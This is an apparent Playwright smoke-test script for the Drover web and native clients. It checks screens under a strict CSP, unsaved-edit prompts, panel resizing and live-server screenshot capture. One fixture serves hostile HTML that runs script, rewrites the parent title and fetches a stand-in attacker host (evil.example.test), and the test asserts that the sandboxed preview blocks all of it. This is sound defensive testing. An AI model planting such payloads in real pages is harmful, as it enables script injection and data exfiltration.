// Smoke-test the trimmed publish under the server's exact CSP. Build Drover.Ui.Tests first for its Playwright runtime,
// or name another copy of the same Playwright version in DROVER_PLAYWRIGHT.
//
// With DROVER_LIVE_ORIGIN set to a running Drover server that serves the native publish under /native/, it instead
// captures each scene of the JSON file DROVER_LIVE_SCENES in both clients against that server's real data, signed in
// as DROVER_LIVE_EMAIL / DROVER_LIVE_PASSWORD when given: web/<scene>-<width>-<theme>.png and
// native/<scene>-<width>-<theme>.png under the folder in argv[2]. See captureLive at the end of this file.
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const repository = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const published = path.resolve(process.argv[2] ?? 'artifacts/native/wwwroot');
const pictures = path.resolve(process.argv[3] ?? 'artifacts/native-smoke');
const referenceOrigin = process.env.DROVER_REFERENCE_ORIGIN;
const referenceRoot = process.env.DROVER_REFERENCE_ROOT;
const reference = Boolean(referenceOrigin || referenceRoot);
const webRoot = referenceRoot ? path.resolve(referenceRoot) : published;
const { chromium } = await import(process.env.DROVER_PLAYWRIGHT ?? path.join(repository, 'tests/Drover.Ui.Tests/bin/Release/net11.0/.playwright/package/index.mjs'));
if (process.env.DROVER_LIVE_ORIGIN) {
    await captureLive(process.env.DROVER_LIVE_ORIGIN, published);
    process.exit(0);
}
const previewOrigin = 'https://preview.other.test';
const headersSource = await fs.readFile(path.join(repository, 'src/Drover.Server/Security/SecurityHeaders.cs'), 'utf8');
const policyDefinition = headersSource.match(/private const string ContentSecurityPolicy =([\s\S]*?);\r?\n/)[1];
const policy = `${[...policyDefinition.matchAll(/"([^"\n]*)"/g)].map(match => match[1]).join('')}; frame-src ${previewOrigin}`;
assert(policy.includes("script-src 'self' 'wasm-unsafe-eval'"));
const previewEndpointsSource = await fs.readFile(path.join(repository, 'src/Drover.Server/Files/PreviewFileEndpoints.cs'), 'utf8');
const previewPolicyBlock = previewEndpointsSource.match(/private static readonly string previewPolicy = string\.Join\(' ',([\s\S]*?)\);/)[1];
const previewBasePolicy = [...previewPolicyBlock.matchAll(/"([^"\n]*)"/g)].map(match => match[1]).join(' ');
const mime = { '.html': 'text/html', '.js': 'text/javascript', '.wasm': 'application/wasm', '.json': 'application/json', '.manifest': 'application/json', '.css': 'text/css', '.svg': 'image/svg+xml', '.png': 'image/png', '.ttf': 'font/ttf' };
const server = http.createServer(async (request, response) => {
    const pathname = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);
    const relative = pathname.replace(reference ? /^\// : /^\/native\/?/, '');
    let file = path.resolve(webRoot, relative);
    response.setHeader('Content-Security-Policy', policy);
    response.setHeader('X-Content-Type-Options', 'nosniff');
    response.setHeader('Cache-Control', 'no-store');
    if (!file.startsWith(`${webRoot}${path.sep}`) && file !== webRoot) {
        response.writeHead(404).end();
        return;
    }
    try {
        if (!path.extname(relative)) {
            file = path.join(webRoot, 'index.html');
        }
        const bytes = await fs.readFile(file);
        response.setHeader('Content-Type', mime[path.extname(file)] ?? 'application/octet-stream');
        response.end(bytes);
    } catch {
        response.writeHead(404).end();
    }
});
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const origin = referenceOrigin ?? `http://127.0.0.1:${server.address().port}`;
const browser = await chromium.launch({ headless: true, ...(process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE ? { executablePath: process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE } : {}), args: ['--no-sandbox'] });
const spaceId = '00000000-0000-7000-8000-0000000000b1';
const botId = '0196f1a0-0000-7000-8000-000000000004';
const connectionId = '0196f1a0-0000-7000-8000-000000000003';
const htmlFileId = '0196f1a0-0000-7000-8000-0000000000f1';
const person = { userId: '00000000-0000-7000-8000-0000000000a1', email: 'sample@example.test', displayName: 'Sample person', spaces: [{ id: spaceId, kind: 'personal', name: 'Sample space', handle: 'sample', role: 'owner' }] };
const connection = { id: connectionId, name: 'Sample connection', kind: 'venice', baseUrl: null, hasKey: true, status: 'ready', defaultModel: 'sample-model', balances: [], balanceReadAt: null, lastCheckedAt: null };
const bot = { id: botId, name: 'Sample bot', handle: 'sample-bot', instructions: 'Sample instructions', modelConnectionId: connectionId, model: 'sample-model', status: 'active' };
const botDetail = {
    ...bot, avatar: {}, descriptionForBots: 'Sample purpose', modelSettings: { webSearch: 'off' },
    memorySettings: { compaction: 'off' }, sandboxPolicy: 'own',
    sandboxSettings: { network: 'off', allowedHosts: [] }, sandboxSharedWith: [], buildLimits: {}, runLimits: {},
};
const thread = { id: '0196f1a0-0000-7000-8000-000000000005', botId, lastActivityAt: '2026-11-18T00:00:00Z', isMain: true };
const messages = [{
    id: '0196f1a0-0000-7000-8000-000000000006', threadId: thread.id, position: 1, role: 'assistant',
    parts: [{ kind: 'text', text: 'Sample reply from the conversation history.' }], createdAt: thread.lastActivityAt,
}];
const exchangedFiles = [{
    file: { id: htmlFileId, name: 'report.html', contentType: 'text/html', kind: 'other', size: 128 },
    threadId: thread.id,
    messageId: messages[0].id,
    inMainConversation: true,
    fromBot: true,
    sharedAt: thread.lastActivityAt,
}];
const usage = {
    botId, botName: bot.name, model: bot.model, own: { cost: 1.23, inputTokens: 120, outputTokens: 45 }, children: [],
};
const screens = [
    ['sign-in', '/sign-in', 'Sign in to Drover', 'Sign in'],
    ['account', '/setup', 'Set up Drover', 'Create your account'],
    ['connect-model', '/setup/model', 'Connect a model'],
    ['meet-bot-empty', '/setup/bot', 'Meet your first bot'],
    ['bots', '/bots', 'Bots'],
    ['bot-editor', `/bots/${botId}`, 'Sample bot', 'Edit Sample bot'],
    ['sandbox-terminal', `/bots/${botId}/sandbox?tab=terminal`, "Sample bot's sandbox"],
    ['conversation', `/talk/${botId}`, 'Sample bot'],
    ['share-empty', '/share', 'Share to Drover'],
    ['models', '/models', 'Model connections'],
    ['status', '/status', 'Status'],
    ['tools-empty', '/tools', 'Tool connections'],
    ['tools', '/tools', 'Tool connections'],
    ['tools-add', '/tools', 'Tool connections'],
    ['tools-review', '/tools', 'Tool connections'],
    ['usage-empty', '/usage', 'Usage'],
    ['usage', '/usage?period=30d', 'Usage'],
    ['extensions-empty', '/extensions', 'Extensions'],
    ['extension-editor-loading', `/extensions/edit?bot=${botId}`, 'Make an extension'],
    ['extension-editor-failed', `/extensions/edit?bot=${botId}`, 'Make an extension'],
    ['extension-editor', '/extensions/edit', 'Make an extension'],
];
const errors = [];
try {
    await fs.mkdir(pictures, { recursive: true });
    for (const theme of ['dark', 'light']) {
        for (const width of [1280, 360]) {
            const context = await browser.newContext({ viewport: { width, height: 1000 }, reducedMotion: 'reduce', serviceWorkers: 'block' });
            await context.addInitScript(theme => {
                if (window === window.top) {
                    localStorage.setItem('drover.theme', theme);
                }
            }, theme);
            const page = await context.newPage();
            page.on('pageerror', error => {
                if (String(error).includes("Failed to read the 'serviceWorker' property from 'Navigator'")
                    || String(error).includes("Failed to read the 'localStorage' property from 'Window'")) {
                    return;
                }
                errors.push(String(error));
            });
            let extensionFailures = 0;
            page.on('console', message => {
                if (message.type() !== 'error') { return; }
                if (message.location().url.startsWith(previewOrigin)) { return; }
                // These two intentional API failures exercise the loading-to-failure and retry states.
                const expectedUrl = `${origin}/api/spaces/${spaceId}/extensions/from-bot/${botId}`;
                if (message.location().url === expectedUrl && message.text() === 'Failed to load resource: the server responded with a status of 503 (Service Unavailable)') {
                    extensionFailures++;
                } else if (current === 'sign-in' && (
                    (message.location().url === `${origin}/api/session` && message.text().includes('401 (Unauthorized)'))
                    || (message.location().url === `${origin}/api/setup` && message.text().includes('404 (Not Found)'))
                )) {
                    return;
                } else { errors.push(`${message.location().url}: ${message.text()}`); }
            });
            let current;
            let heldRoute;
            let previewFrameRequests = [];
            let revokedPreviewGrants = [];
            let externalBeaconRequests = 0;
            await page.route('https://evil.example.test/**', async route => {
                externalBeaconRequests++;
                await route.abort();
            });
            await page.route(`${previewOrigin}/**`, async route => {
                const requestUrl = new URL(route.request().url());
                previewFrameRequests.push({
                    url: requestUrl.pathname + requestUrl.search,
                    cookie: route.request().headers()['cookie'] ?? '',
                    referer: route.request().headers()['referer'] ?? '',
                });
                await route.fulfill({
                    status: 200,
                    contentType: 'text/html; charset=utf-8',
                    headers: {
                        'Content-Security-Policy': `${previewBasePolicy}; frame-ancestors ${origin}`,
                        'Cross-Origin-Resource-Policy': 'cross-origin',
                        'Referrer-Policy': 'no-referrer',
                        'X-Content-Type-Options': 'nosniff',
                        'Cache-Control': 'no-store',
                    },
                    body: '<!DOCTYPE html><html><body><h1 id="preview-heading">Quarterly report</h1><script>window.__ran = true; parent.document.title = "pwned"; fetch("https://evil.example.test/script");</script><img src="https://evil.example.test/beacon.png" onerror="window.__ran = true"></body></html>',
                });
            });
            await page.route('**/api/**', async route => {
                const address = new URL(route.request().url()).pathname;
                let body;
                if (address === '/api/session' && current === 'sign-in') { await route.fulfill({ status: 401 }); return; }
                if (address === '/api/session') { body = person; }
                else if (address === '/api/antiforgery') {
                    await route.fulfill({ status: 204, headers: { 'Set-Cookie': 'XSRF-TOKEN=sample; Path=/; SameSite=Strict' } });
                    return;
                }
                else if (address === '/api/setup' && current === 'sign-in') { await route.fulfill({ status: 404 }); return; }
                else if (address === '/api/setup') { body = { requiresCode: true }; }
                else if (address.endsWith('/model-connections')) { body = current === 'meet-bot-empty' ? [] : [connection]; }
                else if (address.endsWith(`/model-connections/${connectionId}/models`)) { body = []; }
                else if (address.endsWith('/bots')) { body = current === 'meet-bot-empty' ? [] : [bot]; }
                else if (address.endsWith(`/bots/${botId}`)) { body = bot; }
                else if (address.endsWith(`/bots/${botId}/definition`)) { body = botDetail; }
                else if (address.endsWith(`/bots/${botId}/notify`)) { body = { notifies: false }; }
                else if (address.endsWith(`/bots/${botId}/sandbox`)) { body = { available: true, hasSandbox: true, desktop: !reference && current === 'conversation', state: 'running' }; }
                else if (address.endsWith('/sandbox/options')) { body = { available: true, maxIdleMinutes: 60 }; }
                else if (address.endsWith('/rules/options')) { body = { writtenPatterns: true }; }
                else if (address.endsWith('/limits/options')) { body = { maxSteps: 20, maxTokens: 10000, maxDelegations: 3 }; }
                else if (address.endsWith(`/bots/${botId}/threads`)) { body = [thread]; }
                else if (address.endsWith('/main-thread') || address.endsWith(`/threads/${thread.id}`)) { body = thread; }
                else if (address === `/api/spaces/${spaceId}/threads/${thread.id}/models` && route.request().method() === 'GET') {
                    body = { botModel: bot.model, botModelName: bot.model, chosen: null, models: [{ model: bot.model, name: bot.model }] };
                }
                else if (address.endsWith('/summary')) { body = { text: null }; }
                else if (address.endsWith('/seen')) { await route.fulfill({ status: 204 }); return; }
                else if (address.endsWith('/stream')) { await route.fulfill({ contentType: 'text/event-stream', body: ': connected\n\n' }); return; }
                else if (address.endsWith('/messages')) { body = messages; }
                else if (address.endsWith(`/bots/${botId}/files`)) { body = exchangedFiles; }
                else if (address.endsWith(`/files/${htmlFileId}/preview`) && route.request().method() === 'POST') {
                    body = { address: `${previewOrigin}/preview/file?grant=sample-grant`, problem: null, grant: 'sample-grant' };
                }
                else if (address.endsWith(`/files/${htmlFileId}/preview/revoke`) && route.request().method() === 'POST') {
                    revokedPreviewGrants.push(JSON.parse(route.request().postData() ?? '{}').grant);
                    await route.fulfill({ status: 204 });
                    return;
                }
                else if (address.endsWith(`/bots/${botId}/tools`)
                    || ['/rules', '/schedules', '/tool-events'].some(suffix => address.endsWith(suffix))) { body = []; }
                else if (address.endsWith('/status')) { body = { serverRowsShown: true, rows: [{ area: 'server', name: 'Sample database', state: 'ok', summary: 'Sample: working.', checkedAt: null }, { area: 'space', name: 'Sample model', state: 'problem', summary: 'Sample: not answering.', checkedAt: null }] }; }
                else if (address.endsWith('/usage')) {
                    body = { period: current === 'usage' ? '30d' : '7d', since: thread.lastActivityAt, currency: 'usd', crew: current === 'usage' ? [usage] : [] };
                }
                else if (address.endsWith(`/usage/bots/${botId}/runs`)) { body = { botId, currency: 'usd', runs: [] }; }
                else if (address.endsWith('/tool-connections')) { body = current === 'tools-empty' || current === 'tools-add' ? [] : [{ id: connectionId, name: 'Sample tools', slug: 'sample-tools', url: 'https://tools.example.test/mcp', authKind: 'header', trust: 'untrusted', protocolMode: 'automatic', status: 'ready', negotiatedProtocol: null, lastListedAt: null, lastError: null, signInScope: 'space', signIn: null }]; }
                else if (address.endsWith(`/tool-connections/${connectionId}/tools`)) { body = current === 'tools-review' ? [{ id: botId, connectionId, name: 'sample', modelName: 'sample__sample', title: 'Sample tool', description: 'Sample changed description', sensitivity: 'read', state: 'available', lastSeenAt: '2026-11-18T00:00:00Z', needsReview: true, definitionHash: 'sample-current', reviewed: { title: 'Sample tool', description: 'Sample original description', inputSchema: '{}' } }] : []; }
                else if (address.endsWith('/extensions')) { body = []; }
                else if (address.endsWith(`/extensions/from-bot/${botId}`)) {
                    if (current === 'extension-editor-loading') { heldRoute = route; return; }
                    await route.fulfill({ status: 503, json: { title: 'Sample server is unavailable.', status: 503 } });
                    return;
                }
                else { await route.fulfill({ status: 404, body: '' }); return; }
                await route.fulfill({ json: body });
            });
            for (const [name, address, title, heading = title] of screens) {
                current = name;
                const editorLoaded = name === 'bot-editor'
                    ? page.waitForResponse(response => response.ok() && new URL(response.url()).pathname.endsWith(`/bots/${botId}/sandbox`))
                    : null;
                const target = `${reference ? '' : '/native'}${address}`;
                if (name === 'account' || name === 'sign-in' || (reference && (name.startsWith('tools') || name.startsWith('extension-editor')))) {
                    await page.goto(`${origin}${target}`);
                    await page.locator(reference ? '.dv-boot' : '.uno-loader').waitFor({ state: 'hidden', timeout: 60000 });
                } else if (reference) {
                    await page.evaluate(target => globalThis.Blazor.navigateTo(target), target);
                } else {
                    // Exercise the browser-history integration while keeping the already-started runtime.
                    await page.evaluate(target => { history.pushState(null, '', target); dispatchEvent(new PopStateEvent('popstate')); }, target);
                }
                await page.waitForFunction(title => document.title.startsWith(title), title, { timeout: 15000 }).catch(async error => {
                    throw new Error(`${name} at ${width}px in ${theme} expected title "${title}" but found "${await page.title()}" at ${page.url()}.\n${errors.join('\n')}`, { cause: error });
                });
                await page.waitForTimeout(600);
                const pageHeading = page.getByRole('heading', { name: heading, exact: true });
                await (name === 'conversation' ? pageHeading.first() : pageHeading).waitFor({ state: 'attached', timeout: 5000 });
                if (name === 'bot-editor') {
                    await editorLoaded;
                    await page.getByRole('textbox', { name: 'Instructions', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'sandbox-terminal') {
                    await page.getByRole('textbox', { name: 'Shell command', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'conversation') {
                    await page.getByRole('textbox', { name: 'Message to Sample bot', exact: true }).waitFor({ state: 'attached' });
                    await page.getByText(messages[0].parts[0].text, { exact: true }).first().waitFor({ state: 'attached' });
                }
                if (name === 'share-empty') {
                    await page.getByText('Nothing is waiting to be shared. Share text or a file to Drover from another app.', { exact: true })
                        .waitFor({ state: 'attached' });
                }
                if (name === 'usage') {
                    await page.getByRole('link', { name: 'Sample bot', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'tools-empty') {
                    await page.getByRole('heading', { name: 'No tool server yet', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'tools' || name === 'tools-review') {
                    await page.getByRole('heading', { name: 'Sample tools', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'tools-review') {
                    await page.getByRole('button', { name: 'Accept the change to Sample tool', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'tools-add') {
                    await page.getByRole('button', { name: 'Add a tool server', exact: true }).dispatchEvent('click');
                    await page.getByRole('heading', { name: 'Add a tool server', exact: true }).waitFor({ state: 'attached' });
                }
                if (name === 'extension-editor-failed') {
                    await page.getByRole('heading', { name: 'Drover could not open this bot as an extension', exact: true })
                        .waitFor({ state: 'attached', timeout: 5000 });
                }
                assert.equal(errors.length, 0, errors.join('\n'));
                await page.screenshot({ path: path.join(pictures, `${name}-${width}-${theme}.png`) });
                if (name === 'conversation' && !reference) {
                    await checkWorkspacePanels(page, width, theme);
                    if (width === 1280) {
                        await checkHtmlPreviewContainment(page, previewFrameRequests, revokedPreviewGrants, () => externalBeaconRequests);
                    }
                }
                if (name === 'bot-editor' && !reference) {
                    await checkLeavingWithEdits(page, address);
                }
                if (name === 'usage') {
                    const botLink = page.getByRole('link', { name: 'Sample bot', exact: true });
                    if (reference) {
                        await botLink.click();
                    } else {
                        await botLink.dispatchEvent('click');
                    }
                    await page.waitForURL(url => url.searchParams.get('bot') === botId);
                    await page.getByText("Sample bot's most expensive runs in the last 30 days", { exact: true })
                        .waitFor({ state: 'attached' });
                }
                process.stdout.write(`${name} ${width} ${theme}: passed\n`);
                if (heldRoute) {
                    await heldRoute.fulfill({ status: 503, json: { title: 'Sample server is unavailable.', status: 503 } });
                    heldRoute = null;
                }
            }
            // The export is an ordinary download under CSP; verify the delivered bytes, not only the button.
            await page.mouse.move(width / 2, 500);
            await page.mouse.wheel(0, 3000);
            await page.waitForTimeout(200);
            const exportControl = page.getByRole(reference ? 'link' : 'button', { name: 'Download extension.json', exact: true });
            const [saved] = await Promise.all([page.waitForEvent('download'), reference ? exportControl.click() : exportControl.dispatchEvent('click')]);
            assert.equal(saved.suggestedFilename(), 'extension.json');
            const file = JSON.parse(await fs.readFile(await saved.path(), 'utf8'));
            assert.equal(file.version, 1);
            assert.equal(extensionFailures, 2, 'Both deliberate API failures must reach the browser.');
            await context.close();
        }
    }
    assert.equal(errors.length, 0, errors.join('\n'));
} finally {
    await browser.close();
    await new Promise(resolve => server.close(resolve));
}

// Browser Back and closing the tab both ask before unsaved edits are dropped, and neither asks once there are none.
async function checkLeavingWithEdits(page, address) {
    const instructions = page.getByRole('textbox', { name: 'Instructions', exact: true });
    const leavePrompt = page.getByRole('heading', { name: 'Leave without saving', exact: true });
    const editorUrl = page.url();
    await instructions.focus();
    await page.keyboard.type('Sample edit. ');
    await page.waitForTimeout(300);

    await page.goBack();
    await leavePrompt.waitFor({ state: 'attached', timeout: 5000 });
    await page.waitForURL(editorUrl);
    await page.getByRole('button', { name: 'Stay here', exact: true }).dispatchEvent('click');
    await leavePrompt.waitFor({ state: 'detached' });
    assert.equal(page.url(), editorUrl, 'Staying keeps the address of the editor.');
    assert((await instructions.inputValue()).includes('Sample edit. '), 'Staying keeps the edits.');

    const closing = page.waitForEvent('dialog');
    await page.evaluate(() => setTimeout(() => location.reload()));
    const asked = await closing;
    assert.equal(asked.type(), 'beforeunload');
    await asked.dismiss();
    await page.waitForTimeout(300);
    assert.equal(page.url(), editorUrl, 'Declining the browser prompt keeps the page.');

    await page.goBack();
    await leavePrompt.waitFor({ state: 'attached', timeout: 5000 });
    await page.getByRole('button', { name: 'Leave', exact: true }).dispatchEvent('click');
    await page.waitForFunction(() => document.title.startsWith('Bots'), null, { timeout: 15000 });
    assert(!page.url().endsWith(address), 'Leaving goes to where the person was going.');

    let prompts = 0;
    const count = dialog => {
        prompts++;
        return dialog.accept();
    };
    page.on('dialog', count);
    await page.reload();
    await page.locator('.uno-loader').waitFor({ state: 'hidden', timeout: 60000 });
    await page.waitForFunction(() => document.title.startsWith('Bots'), null, { timeout: 15000 });
    page.off('dialog', count);
    assert.equal(prompts, 0, 'With nothing unsaved, reloading asks nothing.');
}

async function checkWorkspacePanels(page, width, theme) {
    const crew = page.getByLabel('Resize the crew sidebar', { exact: true });
    const right = page.getByLabel('Resize the right panel', { exact: true });
    const activity = page.getByRole('link', { name: 'Activity', exact: true });
    const close = page.getByRole('link', { name: 'Close the activity', exact: true });
    const composer = page.getByRole('textbox', { name: 'Message to Sample bot', exact: true });
    const emptyActivity = page.getByRole('heading', { name: 'Nothing has run in this conversation yet', exact: true });

    if (width === 360) {
        assert.equal(await crew.count(), 0);
        assert.equal(await right.count(), 0);
        await page.getByRole('button', { name: 'More about Sample bot' }).dispatchEvent('click');
        await page.getByRole('menuitem', { name: 'Activity', exact: true }).dispatchEvent('click');
        await emptyActivity.waitFor({ state: 'attached' });
        assert.equal(await composer.count(), 0);
        await page.screenshot({ path: path.join(pictures, `conversation-activity-${width}-${theme}.png`) });
        await close.dispatchEvent('click');
        await composer.waitFor({ state: 'attached' });
        return;
    }

    await activity.dispatchEvent('click');
    await emptyActivity.waitFor({ state: 'attached' });

    async function bounds(control) {
        await control.waitFor({ state: 'visible' });
        const box = await control.boundingBox();
        assert(box, `Missing bounds for ${control}`);
        return box;
    }

    async function drag(divider, offset) {
        const before = await bounds(divider);
        const x = before.x + before.width / 2;
        const y = before.y + before.height / 2;
        await page.mouse.move(x, y);
        await page.mouse.down();
        await page.mouse.move(x + offset, y, { steps: 8 });
        await page.mouse.up();
        await page.waitForFunction(({ label, before }) => {
            const divider = document.querySelector(`[aria-label="${label}"]`);
            return divider && divider.getBoundingClientRect().x < before - 20;
        }, { label: await divider.getAttribute('aria-label'), before: before.x });
    }

    await drag(crew, -56);
    await drag(right, -180);
    const narrow = await bounds(right);
    const leftDivider = await bounds(crew);
    assert(narrow.x - (leftDivider.x + leftDivider.width) >= 399, 'The drag squeezed the conversation below 400 px.');

    // The currently focused divider moves right by one keyboard step and respects the drag bounds.
    await page.keyboard.press('ArrowRight');
    await page.waitForFunction(x => document.querySelector('[aria-label="Resize the right panel"]')
        .getBoundingClientRect().x > x + 10, narrow.x);

    const edge = (await bounds(right)).x;
    const start = (await bounds(crew)).x;
    const tabs = ['Activity', 'Summary', 'Memory', 'Screen', 'Files', 'Side chats'];
    const row = await bounds(activity);
    for (const name of tabs) {
        const tab = await bounds(page.getByRole('link', { name, exact: true }));
        assert(tab.x >= start && tab.x + tab.width <= edge + 1, `${name} crosses a panel divider`);
        assert(Math.abs(tab.y - row.y) <= 1, `${name} wrapped to another row`);
    }

    await page.screenshot({ path: path.join(pictures, `conversation-activity-${width}-${theme}.png`) });
    await close.dispatchEvent('click');
    await page.waitForURL(url => url.pathname.endsWith(`/talk/${botId}`));
    await right.waitFor({ state: 'detached' });
    await activity.dispatchEvent('click');
    await page.waitForURL('**/activity');
    await page.waitForFunction(x => {
        const box = document.querySelector('[aria-label="Resize the right panel"]')?.getBoundingClientRect();
        return box && box.width > 0 && Math.abs(box.x - x) <= 1;
    }, edge);
}

async function checkHtmlPreviewContainment(page, previewFrameRequests, revokedPreviewGrants, getBeaconCount) {
    previewFrameRequests.length = 0;
    revokedPreviewGrants.length = 0;
    await page.getByRole('link', { name: 'Files', exact: true }).dispatchEvent('click');
    const previewButton = page.getByRole('button', { name: 'Preview report.html', exact: true });
    await previewButton.waitFor({ state: 'attached', timeout: 5000 });
    await previewButton.dispatchEvent('click');

    const iframe = page.locator('iframe[title="Preview of report.html"]');
    await iframe.waitFor({ state: 'attached', timeout: 5000 });
    const attributes = await iframe.evaluate(element => ({
        allow: element.getAttribute('allow'),
        credentialless: element.getAttribute('credentialless'),
        referrerpolicy: element.getAttribute('referrerpolicy'),
        sandbox: element.getAttribute('sandbox'),
        src: element.getAttribute('src'),
    }));
    assert.deepEqual(attributes, {
        allow: '',
        credentialless: '',
        referrerpolicy: 'no-referrer',
        sandbox: '',
        src: `${previewOrigin}/preview/file?grant=sample-grant`,
    });

    await page.waitForFunction(() => document.querySelector('iframe[title="Preview of report.html"]') !== null);
    const frame = page.frames().find(candidate => candidate.url() === `${previewOrigin}/preview/file?grant=sample-grant`);
    assert(frame, 'Expected the sandboxed preview iframe to navigate to the second origin.');
    await frame.locator('#preview-heading').waitFor({ state: 'attached', timeout: 5000 });
    assert.equal(await frame.locator('#preview-heading').innerText(), 'Quarterly report');

    assert.equal(previewFrameRequests.length, 1);
    assert.equal(previewFrameRequests[0].url, '/preview/file?grant=sample-grant');
    assert.equal(previewFrameRequests[0].cookie, '');
    assert.equal(previewFrameRequests[0].referer, '');

    const probe = await frame.evaluate(() => {
        const check = action => {
            try {
                action();
                return 'allowed';
            } catch (error) {
                return error?.name || String(error);
            }
        };
        return {
            origin: window.origin,
            scriptRan: Boolean(window.__ran),
            parentAccess: check(() => window.parent.document.title),
            cookieAccess: check(() => document.cookie),
            storageAccess: check(() => window.localStorage.getItem('drover.theme')),
        };
    });
    assert.deepEqual(probe, {
        origin: 'null',
        scriptRan: false,
        parentAccess: 'SecurityError',
        cookieAccess: 'SecurityError',
        storageAccess: 'SecurityError',
    });
    assert.equal(getBeaconCount(), 0, 'The sandboxed HTML preview must make zero external network requests.');

    const revoked = page.waitForResponse(response => new URL(response.url()).pathname.endsWith(`/files/${htmlFileId}/preview/revoke`));
    await page.getByRole('button', { name: 'Close', exact: true }).dispatchEvent('click');
    await iframe.waitFor({ state: 'detached', timeout: 5000 });
    await revoked;
    assert.deepEqual(revokedPreviewGrants, ['sample-grant']);
}

/**
 * Captures each scene in both clients against a running server. A scene is
 * { name, path, title?, signedOut?, clients?, height?, hold?, fail?, steps?, webSteps?, nativeSteps?, settle? }, where
 * hold and fail name the end of an API path whose requests are left unanswered (loading) or answered 503 (failed);
 * a step is one of
 * { click: { role, name } }, { focus: { role, name } }, { type: text }, { key: name }, { wheel: pixels },
 * { seen: { role, name } }, { wait: ms }. The native app is a canvas, so its controls are found in the tree the
 * platform builds for assistive technology and pressed with a dispatched click, as above. Console errors are
 * recorded per picture in captures.json beside the pictures, not treated as failures: a live server answers some
 * requests with 401 or 404 on purpose.
 */
async function captureLive(origin, folder) {
    const scenes = JSON.parse(await fs.readFile(process.env.DROVER_LIVE_SCENES, 'utf8'));
    const only = process.env.DROVER_LIVE_ONLY?.split(',');
    const themes = process.env.DROVER_LIVE_THEMES?.split(',') ?? ['dark', 'light'];
    const widths = (process.env.DROVER_LIVE_WIDTHS?.split(',') ?? ['1280', '360']).map(Number);
    const clients = process.env.DROVER_LIVE_CLIENTS?.split(',');
    const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
    const record = JSON.parse(await fs.readFile(path.join(folder, 'captures.json'), 'utf8').catch(() => '{}'));
    let signedIn;
    try {
        if (process.env.DROVER_LIVE_EMAIL) {
            const context = await browser.newContext();
            await context.request.get(`${origin}/api/antiforgery`);
            const token = (await context.cookies()).find(cookie => cookie.name === 'XSRF-TOKEN')?.value;
            const answer = await context.request.post(`${origin}/api/sign-in`, {
                headers: { 'X-XSRF-TOKEN': decodeURIComponent(token ?? '') },
                data: { email: process.env.DROVER_LIVE_EMAIL, password: process.env.DROVER_LIVE_PASSWORD },
            });
            assert(answer.ok(), `Signing in answered ${answer.status()} ${await answer.text()}`);
            signedIn = await context.storageState();
            await context.close();
        }
        for (const scene of scenes.filter(scene => !only || only.includes(scene.name))) {
            for (const theme of themes) {
                for (const width of widths) {
                    for (const client of (scene.clients ?? ['web', 'native']).filter(client => !clients || clients.includes(client))) {
                        const native = client === 'native';
                        const context = await browser.newContext({
                            viewport: { width, height: scene.height ?? 1000 },
                            reducedMotion: 'reduce',
                            serviceWorkers: 'block',
                            ...(scene.signedOut || !signedIn ? {} : { storageState: signedIn }),
                        });
                        await context.addInitScript(theme => localStorage.setItem('drover.theme', theme), theme);
                        const page = await context.newPage();
                        const errors = [];
                        page.on('pageerror', error => errors.push(String(error)));
                        page.on('console', message => message.type() === 'error' && errors.push(message.text()));
                        const name = `${scene.name}-${width}-${theme}`;
                        // A loading state is an API request held unanswered; a failed state is one answered 503.
                        if (scene.hold || scene.fail) {
                            await page.route(url => url.pathname.startsWith('/api/') && url.pathname.endsWith(scene.hold ?? scene.fail), async route => {
                                if (scene.fail) {
                                    await route.fulfill({ status: 503, json: { title: 'Sample: the server is unavailable.', status: 503 } });
                                }
                            });
                        }
                        try {
                            await page.goto(`${origin}${native ? '/native' : ''}${scene.path}`);
                            await page.locator(native ? '.uno-loader' : '.dv-boot').waitFor({ state: 'hidden', timeout: 60000 });
                            if (scene.title) {
                                await page.waitForFunction(title => document.title.startsWith(title), scene.title, { timeout: 15000 });
                            }
                            // The native build starts later and reads its data more slowly; give it longer before acting.
                            await page.waitForTimeout(native ? scene.nativeWait ?? Number(process.env.DROVER_LIVE_NATIVE_WAIT ?? 1500) : 800);
                            for (const step of (native ? scene.nativeSteps : scene.webSteps) ?? scene.steps ?? []) {
                                await perform(page, step, native);
                            }
                            await page.waitForTimeout(scene.settle ?? 600);
                            await fs.mkdir(path.join(folder, client), { recursive: true });
                            await page.screenshot({ path: path.join(folder, client, `${name}.png`) });
                            record[`${client}/${name}`] = { url: page.url(), title: await page.title(), errors };
                            process.stdout.write(`${client} ${name}: captured\n`);
                        } catch (failure) {
                            record[`${client}/${name}`] = { url: page.url(), failed: String(failure).split('\n')[0], errors };
                            process.stdout.write(`${client} ${name}: FAILED ${String(failure).split('\n')[0]}\n`);
                        }
                        await context.close();
                    }
                }
            }
        }
    } finally {
        await fs.writeFile(path.join(folder, 'captures.json'), `${JSON.stringify(record, null, 2)}\n`);
        await browser.close();
    }
}

async function perform(page, step, native) {
    const find = target => page.getByRole(target.role, { name: target.name, exact: target.exact ?? true }).first();
    if (step.click) {
        await (native ? find(step.click).dispatchEvent('click') : find(step.click).click());
    } else if (step.focus) {
        await find(step.focus).focus();
    } else if (step.type !== undefined) {
        await page.keyboard.type(step.type);
    } else if (step.key) {
        await page.keyboard.press(step.key);
    } else if (step.wheel) {
        await page.mouse.move(page.viewportSize().width / 2, 500);
        await page.mouse.wheel(0, step.wheel);
    } else if (step.seen) {
        await find(step.seen).waitFor({ state: 'attached', timeout: 15000 });
    }
    await page.waitForTimeout(step.wait ?? 300);
}
